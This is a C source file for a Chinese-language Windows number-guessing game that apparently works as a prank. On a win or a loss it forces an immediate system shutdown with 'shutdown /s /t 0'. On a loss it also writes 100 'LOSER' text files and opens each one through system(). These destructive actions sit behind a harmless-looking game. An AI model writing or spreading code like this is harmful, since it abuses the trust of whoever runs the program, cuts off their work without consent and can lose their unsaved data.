#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <conio.h>
#include <time.h>
#include <ctype.h>
#include <string.h>

int main() {
    printf("\033[31m\033[1m這是一個猜數字遊戲\033[0m\n");
    Sleep(1000); // 暫停 1 秒
    printf("\033[31m\033[1m你有三次機會猜中數字\033[0m\n");
    Sleep(3000); // 暫停 3 秒

    int n = 0;
    srand(time(NULL)); // 初始化隨機數種子
    int rand_number = rand() % 101; // 產生 0 到 100 的隨機數

    char guess[1000]; // 玩家猜測的數值
    int max = 100;
    int min = 0;
    int number;
    char *endptr;

    while (n < 3) {
        system("cls");
        printf("\033[33m請輸入 %d 到 %d 之間的一個整數數值：\033[0m\n", min, max);
        fgets(guess, sizeof(guess), stdin);

        // 移除換行符（若存在）
        if (guess[strlen(guess) - 1] == '\n') {
            guess[strlen(guess) - 1] = '\0';
        }

        number = strtol(guess, &endptr, 10);

        // 檢查是否成功轉換以及是否有無效字符
        if (*endptr != '\0') {
            printf("對不起，請輸入 %d 到 %d 之間的一個整數數值。\n", min, max);
            continue;
        }

        if (number > max || number < min) {
            printf("對不起，請重新輸入 %d 到 %d 內的數值！\n", min, max);
            Sleep(1000);
            continue;
        }

        if (number == rand_number) {
            printf("\033[33m恭喜猜對！\033[0m\n");
            Sleep(1000);
            printf("\033[33m但沒獎勵哈哈\033[0m\n\n");
            Sleep(1000);
            printf("遊戲結束，電腦即將關機...");
            Sleep(900);
            system("shutdown /s /t 0"); // Windows 關機指令
            break;
        }

        // 如果沒猜對，提示使用者
        if (number > rand_number) {
            printf("\033[31m還是太大了，再小一點點。\033[0m\n");
            max = number;
        } else if (number < rand_number) {
            printf("\033[31m還是太小了，再大一點點。\033[0m\n");
            min = number;
        }

        n++;
        if (n == 3) {
            printf("\033[31m沒機會了。。\033[0m\n");
        } else {
            printf("\033[31m你還有 %d 次機會！\033[0m\n", 3 - n);
        }
        Sleep(1000);
    }

    if (n == 3) {
        printf("\033[33m你輸了\033[0m\n");
        Sleep(1000);
        printf("\033[33m好廢喔呵呵呵\033[0m\n");
        Sleep(3000);
        system("cls");
        printf("\033[31mBIGLOSER！！！\033[0m");
        Sleep(1500);

        for (int i = 1; i <= 100; i++) {
            char filename[20];
            snprintf(filename, sizeof(filename), "LOSER%d.txt", i);

            FILE *file = fopen(filename, "w");
            if (file == NULL) {
                printf("無法創建檔案 %s。\n", filename);
                return 1;
            }

            for (int j = 0; j < 1500; j++) {
                fprintf(file, "LOSER!!  ");
                if ((j + 1) % 30 == 0) {
                    fprintf(file, "\n");
                }
            }

            fclose(file);

            system(filename);
            Sleep(800);
        }
    }

    printf("\033[31m系統即將關機...\033[0m\n");
    Sleep(800);
    system("shutdown /s /t 0"); // Windows 關機指令

    return 0;
}
